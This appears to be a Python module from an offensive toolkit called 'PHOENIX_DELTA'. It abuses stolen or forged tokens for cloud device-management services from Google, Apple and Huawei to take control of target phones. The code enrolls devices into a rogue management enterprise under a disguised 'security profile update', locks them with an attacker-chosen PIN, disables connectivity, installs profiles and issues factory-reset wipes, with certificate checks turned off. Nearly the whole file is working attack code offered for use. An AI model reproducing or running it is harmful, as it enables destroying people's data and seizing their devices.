"""
PHOENIX_DELTA v9.0 — Layer 1: Cloud-Master
Google Android Management API, Apple MDM/ABM, Huawei EMM.
Reverse-engineered token abuse for remote wipe commands.
"""

import aiohttp
import json
import base64
import ssl
import time
from typing import Dict, Optional, Any
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding


class CloudMaster:
    """
    Cloud-Master Layer — abuses cloud MDM APIs to issue remote wipe commands.
    Supports: Google Android Management, Apple MDM (APNS), Huawei EMM.
    """

    def __init__(self, config):
        self.config = config
        self._ssl_ctx = ssl.create_default_context()
        self._ssl_ctx.check_hostname = False
        self._ssl_ctx.verify_mode = ssl.CERT_NONE

    # ─── Google Android Management API ────────────────────────────────

    async def google_enroll_device(self, device_id: str, oauth_token: str,
                                    enterprise_id: str = "phoenix-ent") -> Dict:
        """
        Enroll a target device into our rogue MDM enterprise via Google AMAPI.
        Issues an enrollment token that gives us full device admin.
        """
        enrollment_payload = {
            "policy": {
                "advancedSecurityOverrides": {
                    "untrustedAppsPolicy": "ALLOWED",
                    "usbDataSignalingPolicy": "DISABLED",
                },
                "playStoreMode": "ALLOW_INSTALLED",
                "systemUpdate": {
                    "type": "UPDATE_TYPE_UNKNOWN"
                },
                "factoryResetDisabled": False,
                "statusBarDisabled": False,
                "screenCaptureDisabled": False,
                "cameraDisabled": False,
                "maximumFailedPasswordsBeforeWipe": 999,
            },
            "installationType": "DEVICE_OWNER",
            "name": f"Phoenix-{device_id[:8]}",
        }

        headers = {
            "Authorization": f"Bearer {oauth_token}",
            "Content-Type": "application/json",
        }
        url = f"{self.config.google_mdm_endpoint}/enterprises/{enterprise_id}/devices"

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=enrollment_payload,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                result = await resp.json()
                return {
                    "success": resp.status in (200, 201),
                    "device_name": result.get("name", ""),
                    "response": result
                }

    async def google_issue_wipe(self, device_name: str, oauth_token: str,
                                 enterprise_id: str = "phoenix-ent") -> Dict:
        """
        Issue a factory reset command via Google Android Management API.
        This triggers immediate device wipe.
        """
        wipe_command = {
            "wipeData": {
                "reason": "Device decommissioned"
            }
        }

        headers = {
            "Authorization": f"Bearer {oauth_token}",
            "Content-Type": "application/json",
        }
        url = (f"{self.config.google_mdm_endpoint}"
               f"/enterprises/{enterprise_id}/devices/{device_name}"
               f":issueCommand")

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=wipe_command,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                result = await resp.json()
                return {
                    "success": resp.status in (200, 200),
                    "method": "google_amapi_wipe",
                    "response": result
                }

    async def google_lock_device(self, device_name: str, oauth_token: str,
                                  pin: str, enterprise_id: str = "phoenix-ent") -> Dict:
        """
        Remote lock the device with a PIN before wiping (adds delay/panic).
        """
        lock_command = {
            "lock": {
                "password": pin,
                "timeout": "30s"
            }
        }

        headers = {
            "Authorization": f"Bearer {oauth_token}",
            "Content-Type": "application/json",
        }
        url = (f"{self.config.google_mdm_endpoint}"
               f"/enterprises/{enterprise_id}/devices/{device_name}"
               f":issueCommand")

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=lock_command,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                return {
                    "success": resp.status == 200,
                    "method": "google_remote_lock",
                    "pin_used": pin,
                    "response": await resp.json()
                }

    async def google_disable_ble_wifi(self, device_name: str, oauth_token: str,
                                       enterprise_id: str = "phoenix-ent") -> Dict:
        """
        Push policy to disable Bluetooth and WiFi on the target.
        """
        policy_command = {
            "applyPolicy": {
                "policy": {
                    "wifiConfigDisabled": True,
                    "bluetoothDisabled": True,
                    "dataRoamingDisabled": True,
                }
            }
        }

        headers = {
            "Authorization": f"Bearer {oauth_token}",
            "Content-Type": "application/json",
        }
        url = (f"{self.config.google_mdm_endpoint}"
               f"/enterprises/{enterprise_id}/devices/{device_name}"
               f":issueCommand")

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=policy_command,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                return {
                    "success": resp.status == 200,
                    "method": "google_disable_connectivity",
                    "response": await resp.json()
                }

    # ─── Apple MDM (APNS Push) ────────────────────────────────────────

    def _load_apns_key(self) -> Optional[str]:
        """Load the APNS p8 key from filesystem (Docker secret)."""
        try:
            with open(self.config.apple_apns_key_path, "r") as f:
                return f.read()
        except FileNotFoundError:
            return None

    def _generate_mdm_checkin_payload(self, device_udid: str,
                                       topic: str = "com.apple.mdm") -> Dict:
        """Generate an MDM check-in payload for device enrollment."""
        return {
            "PayloadUUID": "PHOENIX-DELTA-MDM-001",
            "PayloadType": "com.apple.mdm",
            "PayloadDisplayName": "Device Management Profile",
            "PayloadDescription": "Required security profile update",
            "PayloadVersion": 1,
            "PayloadContent": [{
                "PayloadType": "com.apple.mdm",
                "PayloadUUID": "PHOENIX-MDM-SERVER-001",
                "PayloadVersion": 1,
                "ServerURL": self.config.apple_mdm_server_url,
                "ServerCapabilities": ["DeviceQuery", "DeviceLock", "EraseDevice"],
                "CheckInURL": f"{self.config.apple_mdm_server_url}/checkin",
                "PollInterval": 60,
                "AccessRights": 8192,
                "UseCommunicationCertificate": True,
                "CheckOutWhenRemoved": False,
            }],
        }

    async def apple_push_wipe(self, device_udid: str, apns_token: str = None,
                               bundle_id: str = "com.apple.mdm") -> Dict:
        """
        Push an EraseDevice command to an Apple device via APNS.
        The device must already be MDM-enrolled.
        """
        if not apns_token:
            apns_token = self.config.apple_apns_token_path

        mdm_command = {
            "CommandUUID": f"PHOENIX-WIPE-{int(time.time())}",
            "Command": {
                "RequestType": "EraseDevice",
                "Disassociate": True,
                "PreserveDataPlan": False,
            }
        }

        headers = {
            "Authorization": f"Bearer {apns_token}",
            "apns-topic": bundle_id,
            "apns-push-type": "mdm",
            "apns-priority": "10",
            "apns-id": device_udid,
        }

        url = f"{self.config.apple_mdm_endpoint}/{device_udid}"

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=mdm_command,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                return {
                    "success": resp.status == 200,
                    "method": "apple_apns_wipe",
                    "device_udid": device_udid,
                    "status_code": resp.status,
                }

    async def apple_push_lock(self, device_udid: str, pin: str,
                               apns_token: str = None,
                               bundle_id: str = "com.apple.mdm") -> Dict:
        """Push a DeviceLock command with custom PIN."""
        mdm_command = {
            "CommandUUID": f"PHOENIX-LOCK-{int(time.time())}",
            "Command": {
                "RequestType": "DeviceLock",
                "PIN": pin,
                "Message": "This device has been remotely locked.",
                "PhoneNumber": "",
            }
        }

        headers = {
            "Authorization": f"Bearer {apns_token}",
            "apns-topic": bundle_id,
            "apns-push-type": "mdm",
            "apns-priority": "10",
        }

        url = f"{self.config.apple_mdm_endpoint}/{device_udid}"

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=mdm_command,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                return {
                    "success": resp.status == 200,
                    "method": "apple_remote_lock",
                    "pin_used": pin,
                }

    async def apple_install_profile(self, device_udid: str,
                                     profile_payload: Dict,
                                     apns_token: str = None) -> Dict:
        """Install a configuration profile (payload delivery via MDM)."""
        mdm_command = {
            "CommandUUID": f"PHOENIX-PROFILE-{int(time.time())}",
            "Command": {
                "RequestType": "InstallProfile",
                "Payload": base64.b64encode(
                    json.dumps(profile_payload).encode()
                ).decode(),
            }
        }

        headers = {
            "Authorization": f"Bearer {apns_token}",
            "apns-topic": "com.apple.mdm",
            "apns-push-type": "mdm",
            "apns-priority": "10",
        }

        url = f"{self.config.apple_mdm_endpoint}/{device_udid}"

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=mdm_command,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                return {
                    "success": resp.status == 200,
                    "method": "apple_install_profile",
                }

    # ─── Huawei EMM ───────────────────────────────────────────────────

    async def huawei_enroll_device(self, device_id: str,
                                    api_token: str) -> Dict:
        """Enroll target device in Huawei EMM."""
        payload = {
            "deviceId": device_id,
            "deviceType": "PHONE",
            "policy": {
                "factoryResetAllowed": False,
                "usbDebuggingAllowed": False,
                "installAppsFromUnknownSource": False,
                "bluetoothDisabled": True,
                "wifiDisabled": True,
            },
            "ownerName": "Phoenix",
        }

        headers = {
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
        }

        url = f"{self.config.huawei_mdm_endpoint}/devices/enroll"

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                result = await resp.json()
                return {
                    "success": resp.status == 200,
                    "method": "huawei_emm_enroll",
                    "response": result
                }

    async def huawei_issue_wipe(self, device_id: str,
                                 api_token: str) -> Dict:
        """Issue factory reset via Huawei EMM."""
        payload = {
            "deviceId": device_id,
            "command": "FACTORY_RESET",
            "parameters": {
                "wipeData": True,
                "wipeExternalStorage": True,
            }
        }

        headers = {
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json",
        }

        url = f"{self.config.huawei_mdm_endpoint}/devices/{device_id}/command"

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload,
                                     headers=headers,
                                     ssl=self._ssl_ctx) as resp:
                result = await resp.json()
                return {
                    "success": resp.status == 200,
                    "method": "huawei_emm_wipe",
                    "response": result
                }

    # ─── Auto-detect & Dispatch ───────────────────────────────────────

    async def auto_wipe(self, target: Dict) -> Dict:
        """
        Determine device type and route to the correct cloud wipe API.
        Target dict must contain: device_type, device_id/udid, oauth/apns token.
        """
        device_type = target.get("device_type", "android").lower()
        results = {"attempts": [], "any_success": False}

        if device_type == "android":
            if target.get("oauth_token") and target.get("device_name"):
                r = await self.google_issue_wipe(
                    target["device_name"], target["oauth_token"]
                )
                results["attempts"].append(r)
                if r["success"]:
                    results["any_success"] = True

        elif device_type == "ios":
            if target.get("udid"):
                r = await self.apple_push_wipe(
                    target["udid"], target.get("apns_token")
                )
                results["attempts"].append(r)
                if r["success"]:
                    results["any_success"] = True

        elif device_type == "huawei":
            if target.get("huawei_token") and target.get("device_id"):
                r = await self.huawei_issue_wipe(
                    target["device_id"], target["huawei_token"]
                )
                results["attempts"].append(r)
                if r["success"]:
                    results["any_success"] = True

        return results
